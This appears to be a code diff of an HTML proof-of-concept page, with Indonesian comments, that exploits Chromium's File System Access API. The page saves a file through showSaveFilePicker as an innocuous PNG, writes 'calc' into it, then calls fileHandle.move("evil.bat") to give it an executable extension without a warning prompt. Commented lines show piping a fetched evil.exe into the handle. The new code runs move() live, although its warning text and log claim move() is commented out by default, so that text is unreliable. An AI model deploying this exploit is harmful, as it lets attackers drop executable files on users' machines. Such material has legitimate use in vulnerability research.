@@ -3,82 +3,77 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>FSA move PoC (demo)</title>
+  <title>PoC FileSystemFileHandle.move()</title>
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 2rem; }
+    pre { background:#f6f6f6; padding:1rem; border-radius:6px; max-width:900px; white-space:pre-wrap; }
+    .danger { color: #8b0000; font-weight:700; }
+  </style>
 </head>
-<body style="font-family:system-ui,Segoe UI,Roboto,Arial;margin:2rem">
-  <h2>Demo File System Access — showSaveFilePicker()</h2>
+<body>
+  <h2>PoC — FileSystemFileHandle.move()</h2>
+
+  <p class="danger">PERINGATAN: Jangan jalankan <code>move()</code> di mesin utama. Gunakan VM / environment terisolasi.</p>
 
   <p>
-    <button id="btn1">1. showSaveFilePicker(suggestedName: 'hello.exe')</button>
-    — menampilkan dialog dengan ekstensi .exe (expected prompt).
+    Tekan tombol untuk menjalankan skrip PoC. Fungsi akan:
+    <ol>
+      <li>memanggil <code>showSaveFilePicker</code> dengan <code>suggestedName: "hello"</code>,</li>
+      <li>menulis konten sederhana, lalu</li>
+      <li><em>opsional</em> memanggil <code>fileHandle.move("evil.bat")</code> (dikomentari - uncomment jika ingin menguji di VM).</li>
+    </ol>
   </p>
 
-  <p>
-    <button id="btn2">2. PoC: showSaveFilePicker('hello') lalu move('evil.exe')</button>
-    — **BERBAHAYA**: jangan jalankan bagian move() kecuali di VM/isolated test environment.
-  </p>
+  <button id="run">Jalankan PoC</button>
 
-  <pre id="log" style="background:#f6f6f6;padding:1rem;border-radius:6px;max-width:900px"></pre>
+  <pre id="log"></pre>
 
   <script>
     const logEl = document.getElementById('log');
-    function log(...args) { 
-      logEl.textContent += args.join(' ') + '\n'; 
-      console.log(...args);
-    }
+    function log(...args) { logEl.textContent += args.join(' ') + '\\n'; console.log(...args); }
 
-    document.getElementById('btn1').addEventListener('click', async () => {
+    document.getElementById('run').addEventListener('click', async () => {
       try {
-        log('Memanggil showSaveFilePicker dengan suggestedName: hello.exe ...');
-        const fh = await window.showSaveFilePicker({
-          suggestedName: 'hello.exe',
-          startIn: 'desktop',
+        log('1) Memanggil showSaveFilePicker({ suggestedName: "hello", startIn: "desktop", accept: image/png }) ...');
+        const fileHandle = await window.showSaveFilePicker({
+          suggestedName: `hello`,
+          startIn: "desktop",
           types: [{
-            description: 'Executable (for demo)',
-            accept: {'application/octet-stream': ['.exe']}
-          }]
+            description: ['ImageFile'],
+            accept: {
+              'image/png': ['.png']
+            },
+          }],
         });
-        log('File handle diterima:', fh);
-        // tulis konten kecil sebagai demo
-        const w = await fh.createWritable();
-        await w.write(new TextEncoder().encode('This is a harmless demo.'));
-        await w.close();
-        log('File ditulis. (Perhatikan prompt/peringatan browser saat save)');
-      } catch (e) {
-        log('Error / user cancelled:', e && e.message);
-      }
-    });
+        log('2) File handle diterima:', fileHandle);
 
-    document.getElementById('btn2').addEventListener('click', async () => {
-      try {
-        log('Memanggil showSaveFilePicker dengan suggestedName: hello (tanpa ekstensi) ...');
-        const fh = await window.showSaveFilePicker({
-          suggestedName: 'hello',
-          startIn: 'desktop',
-          types: [{
-            description: 'Text file (demo)',
-            accept: {'text/plain': ['.txt']}
-          }]
-        });
-        log('File handle diterima:', fh);
-        const w = await fh.createWritable();
-        // TULIS SEBUAH FILE TEXt YANG AMAN
-        await w.write(new TextEncoder().encode('This file was created by the PoC demo.'));
-        await w.close();
-        log('File aman (.txt) telah ditulis.');
+        log('3) Membuat writable stream dan menulis konten ...');
+        const writableStream = await fileHandle.createWritable();
+            // 3.1 Write malicious file data to download, saved as exe
+    // const evilFile = await fetch(`evil.exe`)
+    // await evilFile.body.pipeTo(writableStream)
+    // fileHandle.move("evil.exe")
+    // 3.2 Or write custom content and close the stream, e.g., .bat
+    await writableStream.write(new TextEncoder().encode(`calc`));
+    await writableStream.close();
+    fileHandle.move("evil.bat")
+        log('4) Tertulis: konten demo ditutup.');
 
-        // ======= POTENSI DANGER: Uncomment untuk menguji move() =======
-        // NOTE: Pada versi Chromium yang rentan, pemanggilan move() setelah save
-        // dapat mengganti nama/ekstensi tanpa prompt keamanan tambahan.
-        // **JANGAN** jalankan ini kecuali di VM / environment terisolasi.
+        // ======= POTENSI BERBAHAYA: Uncomment pada environment terisolasi untuk menguji =======
+        // NOTE: Pada versi Chromium yang rentan, pemanggilan move() setelah save dapat mengganti
+        // nama/ekstensi tanpa dialog peringatan tambahan. HANYA UNCOMMENT jika di VM aman.
         //
-        // log('Menjalankan fh.move(\"evil.exe\")  — ***BERBAHAYA***');
-        // await fh.move('evil.exe');
-        // log('move() selesai. Periksa apakah file berbahaya muncul di Desktop.');
+        // log('5) Menjalankan fileHandle.move("evil.bat")  — ***BERBAHAYA***');
+        // try {
+        //   await fileHandle.move("evil.bat");
+        //   log('move() selesai. Periksa folder (desktop/documents/downloads) untuk file evil.bat');
+        // } catch (err) {
+        //   log('move() gagal / dilempar error:', err && err.message);
+        // }
 
-        log('PoC selesai. Untuk safety, fh.move() dikomentari. Buka source dan baca instruksi.');
-      } catch (e) {
-        log('Error / user cancelled:', e && e.message);
+        log('Selesai. (move() dikomentari secara default)');
+      } catch (error) {
+        log('Error / user cancelled:', error && (error.message || error.toString()));
       }
     });
   </script>
